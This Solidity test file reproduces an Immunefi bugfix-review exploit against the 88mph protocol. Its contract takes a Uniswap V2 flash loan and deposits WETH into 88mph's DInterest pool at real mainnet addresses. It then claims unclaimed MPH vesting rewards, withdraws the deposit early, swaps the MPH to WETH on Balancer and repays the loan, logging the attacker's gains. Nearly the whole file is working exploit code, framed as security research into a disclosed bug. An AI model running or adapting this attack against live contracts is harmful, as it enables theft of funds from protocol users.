pragma solidity ^0.8.13;

//   You can find the original code at: https://medium.com/immunefi/88mph-theft-of-unclaimed-mph-rewards-bugfix-review-1dec98b9956b

import "forge-std/Test.sol";

interface IWETH {
  function balanceOf(address _owner)external view returns(uint256 _balance);
  function approve(address _spender, uint256 _amount)external returns(bool);
  function transfer(address _receiver, uint256 _amount)external returns(bool);
}

interface IDInterest {
    struct Deposit {
        uint256 virtualTokenTotalSupply; // depositAmount + interestAmount, behaves like a zero coupon bond
        uint256 interestRate; // interestAmount = interestRate * depositAmount
        uint256 feeRate; // feeAmount = feeRate * depositAmount
        uint256 averageRecordedIncomeIndex; // Average income index at time of deposit, used for computing deposit surplus
        uint64 maturationTimestamp; // Unix timestamp after which the deposit may be withdrawn, in seconds
        uint64 fundingID; // The ID of the associated Funding struct. 0 if not funded.
    }
    function deposit(uint256 depositAmount, uint64 maturationTimestamp)external returns(uint64 depositID, uint256 interestAmount);
    function getDeposit(uint64 depositID)external view returns (Deposit memory);
    function withdraw(
      uint64 depositID,
      uint256 virtualTokenAmount,
      bool early
    ) external returns (uint256 withdrawnStablecoinAmount);
}

interface IVesting03 {
    struct Vest {
        address pool;
        uint64 depositID;
        uint64 lastUpdateTimestamp;
        uint256 accumulatedAmount;
        uint256 withdrawnAmount;
        uint256 vestAmountPerStablecoinPerSecond;
    }
    function multiWithdraw(uint64[] memory vestIDList) external;
    function withdraw(uint64 vestID) external returns (uint256 withdrawnAmount);
    function getVest(uint64 vestID) external view returns (Vest memory);
    function rewardPerToken(address DInterestPool) external view returns (uint256);
}

interface IERC20 {
  function balanceOf(address _owner)external view returns(uint256 _balance);
  function approve(address _spender, uint256 _amount)external returns(bool);
}

interface IERC721Receiver {
  function onERC721Received(
    address operator,
    address from,
    uint256 tokenId,
    bytes calldata data
  ) external returns (bytes4);
}

interface IAsset{}

interface IBalancer {
  enum SwapKind { GIVEN_IN, GIVEN_OUT }

  struct SingleSwap {
    bytes32 poolId;
    SwapKind kind;
    IAsset assetIn;
    IAsset assetOut;
    uint256 amount;
    bytes userData;
  }

  struct FundManagement {
    address sender;
    bool fromInternalBalance;
    address payable recipient;
    bool toInternalBalance;
  }

  function swap(
    SingleSwap memory singleSwap,
    FundManagement memory funds,
    uint256 limit,
    uint256 deadline
  )external payable returns (uint256 amountCalculated);
}

interface IUniswapV2 {
  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

contract WithFlashloan {

  uint64 public vestingTokenID;
  uint64 public DInterestTokenID;

  uint256 public PRECISION = 1e18;

  uint256 public depositAmount = 414829210384738836; // 0.414 WETH

  IWETH public WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
  IERC20 public _88MPH = IERC20(0x8888801aF4d980682e47f1A9036e589479e835C5);

  IDInterest public DInterest = IDInterest(0xaE5ddE7EA5c44b38c0bCcfb985c40006ED744EA6);
  IVesting03 public Vesting03 = IVesting03(0xA907C7c3D13248F08A3fb52BeB6D1C079507Eb4B);

  IBalancer public Balancer = IBalancer(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
  IUniswapV2 public UniswapV2_USDC = IUniswapV2(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);

  function run()external {
    UniswapV2_USDC.swap(0, depositAmount, address(this), " ");      // Check line 471 from UniswapV2Pair
  }

  function _deposit()internal {
    WETH.approve(address(DInterest), type(uint256).max);
    uint256 _depositAmount = depositAmount;
    uint64 maturationTimestamp = 1666551940; // 1 month
    uint64 depositID;
    uint256 interestAmount;
    (depositID, interestAmount) = DInterest.deposit(depositAmount, maturationTimestamp);
  }

  function _withdraw()internal {
    Vesting03.withdraw(vestingTokenID);
  }

  function _withdrawFunds(bool early)internal {
    DInterest.withdraw(DInterestTokenID, depositAmount, early);
  }

  function _swapAsset()internal {
    _88MPH.approve(address(Balancer), type(uint256).max);
    bytes32 _88mph_poolId = 0x3e09e828c716c5e2bc5034eed7d5ec8677ffba180002000000000000000002b1;
    IBalancer.SingleSwap memory _singleSwap;
    _singleSwap.poolId = _88mph_poolId;
    _singleSwap.kind = IBalancer.SwapKind.GIVEN_IN;
    _singleSwap.assetIn = IAsset(address(_88MPH));
    _singleSwap.assetOut = IAsset(address(WETH));
    _singleSwap.amount = _88MPH.balanceOf(address(this));
    _singleSwap.userData = "";

    IBalancer.FundManagement memory _fundManagement;
    _fundManagement.sender = address(this);
    _fundManagement.fromInternalBalance = false;
    _fundManagement.recipient = payable(address(this));
    _fundManagement.toInternalBalance = false;

    Balancer.swap(_singleSwap, _fundManagement, 0, block.timestamp + 10);
  }

  function calcFlashloanFee(uint256 _amount)public returns(uint256 fee) {
    fee = ((_amount * 1000) / 997) + 1;
  }

  function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external{
    _log();

    _deposit();
    _log();

    _withdraw();
    _log();

    _withdrawFunds(true); // We set it true, because we withdraw it before the maturity ends
    _log();

    _swapAsset();
    _log();

    WETH.transfer(address(UniswapV2_USDC), depositAmount + calcFlashloanFee(depositAmount)); // Return the flash loan + pay fee
    _log();
  }

  function _log()internal {
    console.log("=======================================================================");
    console.log("88MPH Balance in Vesting contract = ", _88MPH.balanceOf(address(Vesting03)));
    console.log("88MPH Balance in Attacker contract = ", _88MPH.balanceOf(address(this)));
    console.log("WETH Balance in Attacker contract = ", WETH.balanceOf(address(this)));
  }

  function onERC721Received(
    address operator,
    address from,
    uint256 tokenId,
    bytes calldata data
  ) external returns (bytes4){
    if (msg.sender == address(Vesting03)){
      vestingTokenID = uint64(tokenId);
    }else {
      DInterestTokenID = uint64(tokenId);
    }
    return IERC721Receiver.onERC721Received.selector;
  }
}